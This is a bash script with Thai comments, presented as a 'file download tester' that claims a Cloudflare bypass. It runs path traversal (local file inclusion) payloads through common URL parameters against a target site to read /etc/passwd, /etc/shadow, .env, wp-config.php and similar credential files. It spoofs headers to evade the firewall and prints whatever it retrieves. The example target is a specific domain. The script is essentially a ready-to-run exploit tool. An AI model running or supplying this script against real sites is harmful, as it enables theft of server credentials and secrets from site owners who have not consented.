#!/bin/bash

# File Download Tester - Using Successful Cloudflare Bypass
# ดาวน์โหลดไฟล์ที่สำคัญโดยใช้เทคนิค bypass ที่สำเร็จแล้ว

TARGET_URL="$1"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 https://pakyok77.link"
    exit 1
fi

# ตรวจสอบ URL
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    TARGET_URL="https://$TARGET_URL"
fi

# สร้างโฟลเดอร์สำหรับเก็บไฟล์
DOWNLOAD_DIR="downloaded_files_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$DOWNLOAD_DIR"
cd "$DOWNLOAD_DIR"

echo "[+] File Download Tester - Cloudflare Bypass"
echo "============================================="
echo "Target: $TARGET_URL"
echo "Download Directory: $DOWNLOAD_DIR"
echo ""

# ใช้ User-Agent ที่สำเร็จแล้ว
SUCCESSFUL_UA="Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"

# ไฟล์ที่ต้องการดาวน์โหลด
FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/hosts"
    "config.php"
    ".env"
    ".htaccess"
    "wp-config.php"
    "database.php"
    "settings.php"
    "config.ini"
)

# Endpoints ที่ใช้ทดสอบ
ENDPOINTS=(
    "index.php?page="
    "search?q="
    "file="
    "page="
    "include="
    "load="
    "view="
    "show="
    "display="
    "read="
)

# Path Traversal Payloads
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "../../../../etc/passwd"
    "../../../../../etc/passwd"
    "../../../../../../etc/passwd"
    "../../../../../../../etc/passwd"
    "../../../../../../../../etc/passwd"
    "../../../config.php"
    "../../../../config.php"
    "../../../../../config.php"
    "../../../.env"
    "../../../../.env"
    "../../../../../.env"
    "../../../.htaccess"
    "../../../../.htaccess"
    "../../../../../.htaccess"
    "../../../wp-config.php"
    "../../../../wp-config.php"
    "../../../../../wp-config.php"
)

echo "[+] Starting file download tests..."
echo ""

SUCCESS_COUNT=0
TOTAL_TESTS=0

# ทดสอบดาวน์โหลดไฟล์
for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${LFI_PAYLOADS[@]}"; do
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        # สร้างชื่อไฟล์
        filename=$(echo "$payload" | sed 's/[^a-zA-Z0-9]/_/g')
        output_file="${endpoint//[^a-zA-Z0-9]/_}_${filename}_${TOTAL_TESTS}.txt"
        
        echo -n "[$TOTAL_TESTS] Testing: $endpoint$payload ... "
        
        # ดาวน์โหลดไฟล์
        response=$(curl -s -w "%{http_code}" -H "User-Agent: $SUCCESSFUL_UA" -H "X-Forwarded-For: 127.0.0.1" "$TARGET_URL/$endpoint$payload" -o "$output_file")
        http_code="${response: -3}"
        
        if [ "$http_code" = "200" ]; then
            file_size=$(stat -c%s "$output_file" 2>/dev/null || echo "0")
            if [ "$file_size" -gt 100 ]; then
                # ตรวจสอบว่าไม่ใช่หน้า Cloudflare block
                if ! grep -q "Cloudflare\|Attention Required\|403 Forbidden" "$output_file" 2>/dev/null; then
                    echo "SUCCESS! (${file_size} bytes)"
                    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                    
                    # แสดงตัวอย่างเนื้อหา
                    echo "   Content preview:"
                    head -3 "$output_file" | sed 's/^/   /'
                    echo ""
                else
                    echo "BLOCKED (Cloudflare detected)"
                    rm -f "$output_file"
                fi
            else
                echo "FAILED (too small: ${file_size} bytes)"
                rm -f "$output_file"
            fi
        else
            echo "FAILED (HTTP $http_code)"
            rm -f "$output_file"
        fi
    done
done

echo ""
echo "============================================="
echo "[+] Download Test Summary"
echo "============================================="
echo "Total Tests: $TOTAL_TESTS"
echo "Successful Downloads: $SUCCESS_COUNT"
echo "Success Rate: $((SUCCESS_COUNT * 100 / TOTAL_TESTS))%"
echo ""

if [ $SUCCESS_COUNT -gt 0 ]; then
    echo "[+] Successfully Downloaded Files:"
    echo "================================="
    for file in *.txt; do
        if [ -f "$file" ]; then
            size=$(stat -c%s "$file" 2>/dev/null || echo "0")
            echo "📄 $file (${size} bytes)"
        fi
    done
    
    echo ""
    echo "[+] File Contents Summary:"
    echo "=========================="
    for file in *.txt; do
        if [ -f "$file" ]; then
            echo ""
            echo "📄 $file:"
            echo "----------------------------------------"
            head -10 "$file"
            if [ $(wc -l < "$file") -gt 10 ]; then
                echo "... (truncated)"
            fi
        fi
    done
else
    echo "[!] No files were successfully downloaded."
    echo "[!] All attempts were blocked by Cloudflare protection."
fi

echo ""
echo "[+] Test completed. Files saved in: $DOWNLOAD_DIR"